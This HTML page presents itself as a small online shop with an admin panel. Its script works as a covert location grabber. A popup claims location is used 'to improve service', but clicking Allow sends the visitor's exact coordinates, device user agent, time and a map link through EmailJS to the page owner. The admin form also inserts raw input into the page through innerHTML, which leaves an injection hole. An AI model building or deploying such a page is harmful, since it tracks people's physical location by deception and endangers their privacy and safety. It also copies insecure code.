<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>My Online Shop</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; margin: 0; background: #f5f5f5; }
    header { background: #0d6efd; color: #fff; padding: 15px; text-align: center; }
    .container { padding: 15px; }
    .products { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
    .card { background: #fff; border-radius: 10px; padding: 10px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
    .card img { width: 100%; border-radius: 10px; }
    .card h3 { margin: 10px 0 5px; }
    .price { color: green; font-weight: bold; }
    button { background: #0d6efd; color: #fff; border: none; padding: 10px; width: 100%; border-radius: 5px; cursor: pointer; }
    button:hover { background: #084298; }
    .cart { position: fixed; bottom: 0; left: 0; right: 0; background: #fff; padding: 10px; box-shadow: 0 -2px 6px rgba(0,0,0,0.2); }
    .admin { margin-top: 20px; background: #fff; padding: 15px; border-radius: 10px; box-shadow: 0 2px 6px rgba(0,0,0,0.1); }
    .admin input { padding: 10px; margin: 5px 0; width: 100%; }

    #locationBox {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }
    #locationBox div {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 320px;
      text-align: center;
    }
  </style>
</head>
<body>

<header>
  <h1>My Online Shop</h1>
  <p>Shopping Website with Admin Panel</p>
</header>

<!-- Location Consent Popup -->
<div id="locationBox">
  <div>
    <h3>Allow Location Access</h3>
    <p>We use your location to improve service.</p>
    <button onclick="getLocation()">Allow</button>
    <button onclick="denyLocation()" style="background:#6c757d;margin-top:10px;">Deny</button>
  </div>
</div>

<div class="container">
  <div class="products" id="productList">
    <div class="card">
      <img src="https://via.placeholder.com/300" alt="Product">
      <h3>Product 1</h3>
      <p class="price">₹499</p>
      <button onclick="addToCart('Product 1', 499)">Add to Cart</button>
    </div>
  </div>

  <div class="admin">
    <h2>Admin Panel</h2>
    <input type="text" id="productName" placeholder="Product Name">
    <input type="number" id="productPrice" placeholder="Product Price">
    <input type="text" id="productImage" placeholder="Product Image URL">
    <button onclick="addProduct()">Add Product</button>
  </div>
</div>

<div class="cart" id="cart">Cart: 0 items | Total: ₹0</div>

<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs@3/dist/email.min.js"></script>

<script>
  (function(){ emailjs.init("mnjW85vNSgiyTMTv8"); })();

  let cartCount = 0, total = 0;

  function addToCart(name, price) {
    cartCount++; total += price;
    document.getElementById('cart').innerText = `Cart: ${cartCount} items | Total: ₹${total}`;
  }

  function addProduct() {
    const n = productName.value, p = productPrice.value, i = productImage.value;
    if(!n||!p||!i) return alert('Fill all fields');
    productList.innerHTML += `
      <div class='card'>
        <img src='${i}'>
        <h3>${n}</h3>
        <p class='price'>₹${p}</p>
        <button onclick="addToCart('${n}', ${p})">Add to Cart</button>
      </div>`;
    productName.value = productPrice.value = productImage.value = '';
  }

  function getLocation() {
    navigator.geolocation.getCurrentPosition(showPosition, denyLocation);
  }

  function showPosition(pos) {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const time = new Date().toLocaleString();
    const device = navigator.userAgent;
    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;

    emailjs.send("service_n0wwoq", "template_4obvgbj", {
      lat, lon, time, device, mapLink
    });

    locationBox.style.display = 'none';
  }

  function denyLocation() {
    locationBox.style.display = 'none';
  }
</script>

</body>
</html>
